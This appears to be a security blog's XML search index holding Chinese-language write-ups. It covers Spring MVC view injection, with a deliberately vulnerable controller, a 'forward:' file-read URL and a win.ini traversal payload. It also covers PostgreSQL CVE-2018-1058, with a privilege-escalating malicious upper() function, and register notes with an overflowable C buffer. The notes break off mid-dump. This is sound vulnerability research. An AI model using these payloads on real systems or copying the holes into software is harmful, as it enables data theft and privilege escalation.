<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Spring视图注入漏洞]]></title>
      <url>/2018/09/18/spring-view-injection/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>  在一次对某客户的检测过程中，发现了一个由Spring应用开发程序员错误书写代码导致的安全问题。过后对该漏洞进行相应的研究，了解此漏洞背景知识是要先了解基础的MVC开发模式。</p>
  <a id="more"></a>
<p>  <img src="/old/2018/09/18/spring-view-injection/mvc.jpeg" alt="MVC"></p>
<p>具体相关依赖知识在此就不进行赘述。</p>
<h3 id="1-Spring-MVC-的报错页面"><a href="#1-Spring-MVC-的报错页面" class="headerlink" title="1. Spring MVC 的报错页面"></a>1. Spring MVC 的报错页面</h3><p>在对客户网站的参数进行常规异常输入时，遇见了一个非常让人困惑的HTTP 500错误页面。<br>为什么一个参数能导致/Spring提供View的功能错误？</p>
<p>  <img src="/old/2018/09/18/spring-view-injection/url.jpeg" alt="错误页面"></p>
<h3 id="2-Debug回溯"><a href="#2-Debug回溯" class="headerlink" title="2. Debug回溯"></a>2. Debug回溯</h3><p>以下为Exception回溯内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">HTTP Status 500 - Could not resolve view with name &apos;test&apos; in servlet with name &apos;action&apos;</div><div class="line"></div><div class="line">javax.servlet.ServletException: Could not resolve view with name &apos;test&apos; in servlet with name &apos;action&apos;</div><div class="line">	org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1190)</div><div class="line">	org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:992)</div><div class="line">	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:939)</div><div class="line">	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:856)</div><div class="line">	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:920)</div><div class="line">	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:816)</div><div class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:624)</div><div class="line">	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:801)</div><div class="line">	javax.servlet.http.HttpServlet.service(HttpServlet.java:731)</div><div class="line">	filter.CompanyFilter.doFilter(CompanyFilter.java:50)</div><div class="line">	filter.LoginFilter.doFilter(LoginFilter.java:89)</div><div class="line">	filter.HttpRequestFilter.doFilter(HttpRequestFilter.java:24)</div><div class="line">	com.eall.hr.web.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:73)</div><div class="line">	org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449)</div><div class="line">	org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365)</div><div class="line">	org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90)</div><div class="line">	org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83)</div><div class="line">	org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:383)</div><div class="line">	org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362)</div><div class="line">	org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125)</div><div class="line">	org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)</div><div class="line">	org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)</div></pre></td></tr></table></figure>
<p>于是下载了Spring的源代码进行分析，<code>Could not resolve view with name</code>此串字符在Spring中只有3至4次出现的地方，所以较好定位报错地点。</p>
<p><img src="/old/2018/09/18/spring-view-injection/source-code-search.jpeg" alt="源代码"></p>
<p>而且报错页面没有被关闭，所以通过上图也能直接找到引发错误的原因为以下代码行。</p>
<p><code>org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1190)</code></p>
<p>render()函数源代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(ModelAndView mv, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">  <span class="comment">// Determine locale for request and apply it to the response.</span></div><div class="line">  Locale locale =</div><div class="line">      (<span class="keyword">this</span>.localeResolver != <span class="keyword">null</span> ? <span class="keyword">this</span>.localeResolver.resolveLocale(request) : request.getLocale());</div><div class="line">  response.setLocale(locale);</div><div class="line"></div><div class="line">  View view;</div><div class="line">  String viewName = mv.getViewName();</div><div class="line">  <span class="keyword">if</span> (viewName != <span class="keyword">null</span>) &#123;</div><div class="line">    <span class="comment">// We need to resolve the view name.</span></div><div class="line">    view = resolveViewName(viewName, mv.getModelInternal(), locale, request);</div><div class="line">    <span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"Could not resolve view with name '"</span> + mv.getViewName() +</div><div class="line">          <span class="string">"' in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// No need to lookup: the ModelAndView object contains the actual View object.</span></div><div class="line">    view = mv.getView();</div><div class="line">    <span class="keyword">if</span> (view == <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"ModelAndView ["</span> + mv + <span class="string">"] neither contains a view name nor a "</span> +</div><div class="line">          <span class="string">"View object in servlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// Delegate to the View object for rendering.</span></div><div class="line">  <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">    logger.trace(<span class="string">"Rendering view ["</span> + view + <span class="string">"] "</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (mv.getStatus() != <span class="keyword">null</span>) &#123;</div><div class="line">      response.setStatus(mv.getStatus().value());</div><div class="line">    &#125;</div><div class="line">    view.render(mv.getModelInternal(), request, response);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">catch</span> (Exception ex) &#123;</div><div class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</div><div class="line">      logger.debug(<span class="string">"Error rendering view ["</span> + view + <span class="string">"]"</span>, ex);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">throw</span> ex;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最终调用到的就是render函数。</p>
<p>先需要了解一下Spring MVC的整个调用流程。</p>
<p><img src="/old/2018/09/18/spring-view-injection/process-flow.jpeg" alt="调用流程"></p>
<p><code>doGet() -&gt; processRequest() -&gt; doService() -&gt; doDispatch() -&gt; processDispatcheRequestResult() -&gt; render()</code></p>
<p>在render()函数中，最终会追踪到函数createView()。</p>
<p>createView()函数原型：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">  <span class="comment">// If this resolver is not supposed to handle the given view,</span></div><div class="line">  <span class="comment">// return null to pass on to the next resolver in the chain.</span></div><div class="line">  <span class="keyword">if</span> (!canHandle(viewName, locale)) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// Check for special "redirect:" prefix.</span></div><div class="line">  <span class="keyword">if</span> (viewName.startsWith(REDIRECT_URL_PREFIX)) &#123;</div><div class="line">    String redirectUrl = viewName.substring(REDIRECT_URL_PREFIX.length());</div><div class="line">    RedirectView view = <span class="keyword">new</span> RedirectView(redirectUrl,</div><div class="line">        isRedirectContextRelative(), isRedirectHttp10Compatible());</div><div class="line">    String[] hosts = getRedirectHosts();</div><div class="line">    <span class="keyword">if</span> (hosts != <span class="keyword">null</span>) &#123;</div><div class="line">      view.setHosts(hosts);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> applyLifecycleMethods(REDIRECT_URL_PREFIX, view);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// Check for special "forward:" prefix.</span></div><div class="line">  <span class="keyword">if</span> (viewName.startsWith(FORWARD_URL_PREFIX)) &#123;</div><div class="line">    String forwardUrl = viewName.substring(FORWARD_URL_PREFIX.length());</div><div class="line">    InternalResourceView view = <span class="keyword">new</span> InternalResourceView(forwardUrl);</div><div class="line">    <span class="keyword">return</span> applyLifecycleMethods(FORWARD_URL_PREFIX, view);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// Else fall back to superclass implementation: calling loadView.</span></div><div class="line">  <span class="keyword">return</span> <span class="keyword">super</span>.createView(viewName, locale);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到Spring对两种前缀(forward:与redirect)进行了特殊处理。</p>
<hr>
<p><em>InternalResourceView</em>：</p>
<p>根据视图名到指定的位置获取对应的模板文件</p>
<p><em>RedirectView</em>：</p>
<p>根据视图名跳转</p>
<hr>
<p>在处理<code>forward:</code>时会再调用一次InternalResourceView，而InternalResourceView是Spring中用来加载Jar包中内部资源用的，所以可以用来做Jar包内的任意文件读取。</p>
<p>不过以上InternalResourceView受配置影响：</p>
<p>例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;bean id=&quot;viewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</div><div class="line">   &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/&quot;/&gt;</div><div class="line">&lt;/bean&gt;</div></pre></td></tr></table></figure></p>
<p>如果此时调用InternalResourceView实际上会在前面加上前缀<code>/WEB-INF/</code>，所以在配置suffix的情况下，可能就不能读取任意Jar包内的文件了。</p>
<h3 id="3-危害"><a href="#3-危害" class="headerlink" title="3. 危害"></a>3. 危害</h3><p>所以如上所述的这些东西到底能造成什么危害呢？</p>
<p>初步想法为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. 权限认证Bypass</div><div class="line">2. 文件读取</div><div class="line">3. 重定向</div><div class="line">4. HTTP Header Injection</div></pre></td></tr></table></figure>
<p>写了一个本地测试有漏洞的代码Demo验证以上想法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">package chaitin;</div><div class="line"></div><div class="line">import org.springframework.stereotype.Controller;</div><div class="line">import org.springframework.ui.Model;</div><div class="line">import org.springframework.web.bind.annotation.GetMapping;</div><div class="line">import org.springframework.web.bind.annotation.ModelAttribute;</div><div class="line">import org.springframework.web.bind.annotation.RequestParam;</div><div class="line">import org.springframework.web.bind.annotation.SessionAttributes;</div><div class="line">import org.springframework.web.servlet.ModelAndView;</div><div class="line"></div><div class="line">import java.util.Map;</div><div class="line"></div><div class="line">import javax.servlet.http.Cookie;</div><div class="line">import javax.servlet.http.HttpServletRequest;</div><div class="line">import javax.servlet.http.HttpServletResponse;</div><div class="line"></div><div class="line">@Controller</div><div class="line">public class UserLoginController &#123;</div><div class="line"></div><div class="line">	@GetMapping(&quot;/login&quot;)</div><div class="line">	public ModelAndView login(HttpServletResponse response,</div><div class="line">			@RequestParam(name = &quot;username&quot;, required = true, defaultValue = &quot;admin&quot;) String username,</div><div class="line">			@RequestParam(name = &quot;password&quot;, required = true, defaultValue = &quot;******&quot;) String password,</div><div class="line">			@RequestParam(name = &quot;view&quot;, required = true, defaultValue = &quot;UsersLogin&quot;) String view, Model user) &#123;</div><div class="line">		user.addAttribute(&quot;username&quot;, username);</div><div class="line">		user.addAttribute(&quot;password&quot;, password);</div><div class="line">    	System.out.println(Class.class.getClass().getResource(&quot;/&quot;).getPath());</div><div class="line"></div><div class="line"></div><div class="line">		if (username.equals(&quot;admin&quot;) &amp;&amp; password.equals(&quot;123123&quot;)) &#123;</div><div class="line">			response.addCookie(new Cookie(&quot;AdminStatus&quot;, &quot;true&quot;));</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		return new ModelAndView(view);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="1-权限认证Bypass-成功"><a href="#1-权限认证Bypass-成功" class="headerlink" title="(1) 权限认证Bypass [成功]"></a>(1) 权限认证Bypass [成功]</h5><p>假设采用了装饰器（Decorator）来进行敏感功能的统一权限认证，直接使用view的<code>forward:</code>是能够直接绕过权限认证装饰器，对敏感功能进行直接访问。</p>
<p><img src="/old/2018/09/18/spring-view-injection/spring-bypass-auth.jpeg" alt="Spring权限认证Bypass"></p>
<h5 id="2-文件读取-成功"><a href="#2-文件读取-成功" class="headerlink" title="(2) 文件读取 [成功]"></a>(2) 文件读取 [成功]</h5><p>测试URL：<br><a href="http://127.0.0.1:8080/login?username=admin&amp;password=111&amp;view=forward:/database.properties" target="_blank" rel="external">http://127.0.0.1:8080/login?username=admin&amp;password=111&amp;view=forward:/database.properties</a></p>
<p><img src="/old/2018/09/18/spring-view-injection/file-loading.jpeg" alt="文件读取"></p>
<h5 id="3-HTTP-Header-Injection-失败"><a href="#3-HTTP-Header-Injection-失败" class="headerlink" title="(3) HTTP Header Injection [失败]"></a>(3) HTTP Header Injection [失败]</h5><p>由于Spring对传入程序的CRLF进行了处理。将其转化为了空格，所以该漏洞没有成功实现。</p>
<h3 id="4-限制"><a href="#4-限制" class="headerlink" title="4. 限制"></a>4. 限制</h3><p>该漏洞有以下两点限制</p>
<ul>
<li><ol>
<li>无法读取Jar外的文件</li>
</ol>
</li>
<li><ol>
<li>如果加了suffix可能，无法读取想要的文件</li>
</ol>
</li>
</ul>
<p>对于第1点限制，有一个未经验证的想法。是否能组合CVE-2018-1271在Windows环境下对目录外的文件进行读取呢？但是由于手头边Windows环境还没有搭建好，可能需要过段时间才能进行测试:p</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/resources/%5c%5c..%5c/..%5c/..%5c/..%5c/..%5c/..%5c/..%5c/..%5c/..%5c/windows/win.ini</div></pre></td></tr></table></figure>
<h3 id="5-Exploit"><a href="#5-Exploit" class="headerlink" title="5. Exploit!"></a>5. Exploit!</h3><p><img src="/old/2018/09/18/spring-view-injection/expolit.jpeg" alt="读取成功"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" target="_blank" rel="external">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a><br><a href="https://danielmiessler.com/study/mvc/" target="_blank" rel="external">https://danielmiessler.com/study/mvc/</a></p>
]]></content>
      
        <categories>
            
            <category> 安全研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Spring </tag>
            
            <tag> View injection </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Postgresql 设计缺陷CVE-2018-1058 漏洞分析]]></title>
      <url>/2018/03/07/CVE-2018-1058/</url>
      <content type="html"><![CDATA[<h1 id="Postgresql-设计缺陷CVE-2018-1058-漏洞分析"><a href="#Postgresql-设计缺陷CVE-2018-1058-漏洞分析" class="headerlink" title="Postgresql 设计缺陷CVE-2018-1058 漏洞分析"></a>Postgresql 设计缺陷CVE-2018-1058 漏洞分析</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2018年3月1日，PostgreSQL全球开发团队发布了多个系列版本的PostgreSQL安全升级。此次升级修复了CVE-2018-1058，该漏洞可以攻击者“劫持”PostgreSQL数据库的函数，从而使高权限用户在不知情的情况下，执行攻击者设定的恶意SQL语句。</p>
<a id="more"></a>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>想要理解此漏洞需要先了解PostgreSQL两方面的设计。</p>
<p><em>1. schemas</em></p>
<p>PostgreSQL自7.3版本以后允许用户在数据库中创建一类命名空间schemas，允许多用户使用同一数据库而不会互相影响，让数据库里的对象从逻辑上更易于管理。当用户创建数据库后，默认操作设置都是在名为“public”的schema下进行的。例如<code>SELECT * FROM Infomation;</code>实际上等于<code>SELECT * FROM public.Infomation;</code></p>
<p>在默认情况下，任何用户可以在<code>public</code>下创建对象(新建表、新建函数等操作)。</p>
<p><em>2. search_path 搜索顺序</em></p>
<p>因为PostgreSQL提供了schemas这个功能，假如用户新建了一个schema叫做<code>private</code>，在此schema中新建了一个和<code>public</code>中的同名表<code>Information</code>。</p>
<p>当用户执行<code>SELECT * FROM Information;</code>没有指定schema时，PostgreSQL就会根据下图流程进行优先顺序的判断：</p>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_959ea8bcdff00487b37906ce35753d76.png" alt=""></p>
<p>当PostgreSQL遇到按照顺序遇到“最佳匹配”时，就会选择该schema进行操作(其中$user为当前session用户)。</p>
<h3 id="漏洞利用场景"><a href="#漏洞利用场景" class="headerlink" title="漏洞利用场景"></a>漏洞利用场景</h3><p>首先分别创建高低权限用户</p>
<blockquote>
<p>administrator: 所有权限<br>hacker: 只有对public的create权限</p>
</blockquote>
<p><b>目标：获取只有administrator拥有权限读取的<code>private</code> schema表Information中的信息。</b></p>
<p>在用revoke命令去除hacker账户的对private schema 的SELECT权限之后，hacker没有权限读取到private.Information的数据。</p>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_3ee2b83965fc19507cfe329db80b0c65.png" alt=""></p>
<p>攻击者编写如下恶意Postgresql函数:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> <span class="keyword">upper</span>(<span class="built_in">varchar</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> $$</div><div class="line">    <span class="keyword">ALTER</span> <span class="keyword">ROLE</span> hacker SUPERUSER;</div><div class="line">    <span class="keyword">SELECT</span> pg_catalog.upper($<span class="number">1</span>);</div><div class="line">$$ LANGUAGE SQL VOLATILE;</div></pre></td></tr></table></figure>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_e4169c3cfb1c5d29dcbb9e4169c5cc6d.png" alt=""></p>
<p>模拟以administrator用户打开另外一个SESSION，可以看见administrator能够读取private.Information下的敏感信息。</p>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_3f460938e713281d1399a6066aac4b0f.png" alt=""></p>
<p>当administrator执行<code>select upper((select * from private.Information));</code>时，就会触发hacker的恶意函数。</p>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_d430def469f633b7f8674c79a8abd3f6.png" alt=""></p>
<p>可以看到hacker权限已经被修改为了SUPERUSER，并且private.Information里的内容也可以读取了。</p>
<p>其中先执行了public.upper而没有执行pg_catalog.upper的原因是这两个函数所接受的参数类型不一样。</p>
<p>对比：<br>pg_catalog.upper(text)<br>public.upper(varchar)</p>
<p>varchar与text两种在Postgresql中属于相似但不同的变量类型。</p>
<p><img src="/old/2018/03/07/CVE-2018-1058/upload_d481a1249de52b4757bc3570149d5328.png" alt=""></p>
<p>hacker编写的upper函数接受的是varchar类型的参数，而pg_catalog中内置的系统函数接受的参数为text。所以恶意upper函数属于“最佳匹配”，最终administrator会执行恶意upper()函数，导致SQL执行流程被篡改。</p>
<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><blockquote>
<p>影响版本:<br>Redhat Satellite 5<br>PostgreSQL PostgreSQL 9.6.7<br>PostgreSQL PostgreSQL 9.6.4<br>PostgreSQL PostgreSQL 9.6<br>PostgreSQL PostgreSQL 9.5.11<br>PostgreSQL PostgreSQL 9.5.10<br>PostgreSQL PostgreSQL 9.5.9<br>PostgreSQL PostgreSQL 9.5.8<br>PostgreSQL PostgreSQL 9.5.7<br>PostgreSQL PostgreSQL 9.5.6<br>PostgreSQL PostgreSQL 9.5.4<br>PostgreSQL PostgreSQL 9.5.1<br>PostgreSQL PostgreSQL 9.5<br>PostgreSQL PostgreSQL 9.4.16<br>PostgreSQL PostgreSQL 9.4.15<br>PostgreSQL PostgreSQL 9.4.14<br>PostgreSQL PostgreSQL 9.4.13<br>PostgreSQL PostgreSQL 9.4.12<br>PostgreSQL PostgreSQL 9.4.11<br>PostgreSQL PostgreSQL 9.4.9<br>PostgreSQL PostgreSQL 9.4.6<br>PostgreSQL PostgreSQL 9.4.5<br>PostgreSQL PostgreSQL 9.4.4<br>PostgreSQL PostgreSQL 9.4.3<br>PostgreSQL PostgreSQL 9.4.2<br>PostgreSQL PostgreSQL 9.4.1<br>PostgreSQL PostgreSQL 9.4<br>PostgreSQL PostgreSQL 9.3.21<br>PostgreSQL PostgreSQL 9.3.20<br>PostgreSQL PostgreSQL 9.3.19<br>PostgreSQL PostgreSQL 9.3.18<br>PostgreSQL PostgreSQL 9.3.17<br>PostgreSQL PostgreSQL 9.3.16<br>PostgreSQL PostgreSQL 9.3.14<br>PostgreSQL PostgreSQL 9.3.11<br>PostgreSQL PostgreSQL 9.3.10<br>PostgreSQL PostgreSQL 9.3.9<br>PostgreSQL PostgreSQL 9.3.8<br>PostgreSQL PostgreSQL 9.3.7<br>PostgreSQL PostgreSQL 9.3.6<br>PostgreSQL PostgreSQL 9.3.5<br>PostgreSQL PostgreSQL 9.3.4<br>PostgreSQL PostgreSQL 9.3.3<br>PostgreSQL PostgreSQL 9.3.2<br>PostgreSQL PostgreSQL 9.3<br>PostgreSQL PostgreSQL 9.6.6<br>PostgreSQL PostgreSQL 9.6.3<br>PostgreSQL PostgreSQL 9.6.2<br>PostgreSQL PostgreSQL 9.6.1<br>PostgreSQL PostgreSQL 9.5.2<br>PostgreSQL PostgreSQL 9.4.1-1<br>PostgreSQL PostgreSQL 9.3.1<br>PostgreSQL PostgreSQL 10.0</p>
<p>未影响版本：<br>PostgreSQL PostgreSQL 9.6.8<br>PostgreSQL PostgreSQL 9.5.12<br>PostgreSQL PostgreSQL 9.4.17<br>PostgreSQL PostgreSQL 9.3.22<br>PostgreSQL PostgreSQL 10.3</p>
</blockquote>
<h2 id="漏洞修复方案："><a href="#漏洞修复方案：" class="headerlink" title="漏洞修复方案："></a>漏洞修复方案：</h2><p>官方修复建议：</p>
<ol>
<li>超级管理员可以移除所有用户在public schema中创建对象的权限：</li>
</ol>
<p><code>REVOKE CREATE ON SCHEMA public FROM PUBLIC;</code></p>
<p>该操作会导致所有非超级用户无法进行创建对象，可能影响用户管理程序。</p>
<ol>
<li>检测对比public中与pg_catalog是否有相似对象，防止已经被恶意篡改。</li>
</ol>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">\df public.*</div><div class="line"></div><div class="line">\df pg_catalog.*</div></pre></td></tr></table></figure>
<ol>
<li>只设置用户seach_path值为”$user”变量。</li>
</ol>
<p><code>ALTER ROLE username SET search_path = &quot;$user&quot;;</code></p>
<p>官方概括了整个防御策略为：”Do not allow users to create new objects in the public schema” strategy。</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Postgresql </tag>
            
            <tag> 设计缺陷 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[寄存器相关知识笔记]]></title>
      <url>/2017/12/05/%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<h2 id="X86-64-Register"><a href="#X86-64-Register" class="headerlink" title="X86-64 Register"></a>X86-64 Register</h2><h3 id="Simple-Demo-1"><a href="#Simple-Demo-1" class="headerlink" title="Simple Demo 1"></a>Simple Demo 1</h3><a id="more"></a>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">char</span> *str)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span>    buffer[<span class="number">256</span>];</div><div class="line">	<span class="keyword">int</span>     i;</div><div class="line"></div><div class="line">	i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(*str) buffer[i++] = *str++;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> ac, <span class="keyword">char</span> **av)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">char</span>    *fstring = <span class="string">"First string"</span>;</div><div class="line">        <span class="keyword">char</span>    *sstring = <span class="string">"Second string"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(ac &gt;= <span class="number">2</span>)</div><div class="line">        func(av[<span class="number">1</span>]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s =&gt; %s\n"</span>,fstring,sstring);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="GDB-Disassemble-Output"><a href="#GDB-Disassemble-Output" class="headerlink" title="GDB Disassemble Output"></a>GDB Disassemble Output</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function main:</div><div class="line">   0x0000000100000f00 &lt;+0&gt;:	push   %rbp</div><div class="line">   0x0000000100000f01 &lt;+1&gt;:	mov    %rsp,%rbp</div><div class="line">   0x0000000100000f04 &lt;+4&gt;:	sub    $0x30,%rsp</div><div class="line">   0x0000000100000f08 &lt;+8&gt;:	lea    0x88(%rip),%rax        # 0x100000f97</div><div class="line">   0x0000000100000f0f &lt;+15&gt;:	lea    0x74(%rip),%rcx        # 0x100000f8a</div><div class="line">   0x0000000100000f16 &lt;+22&gt;:	movl   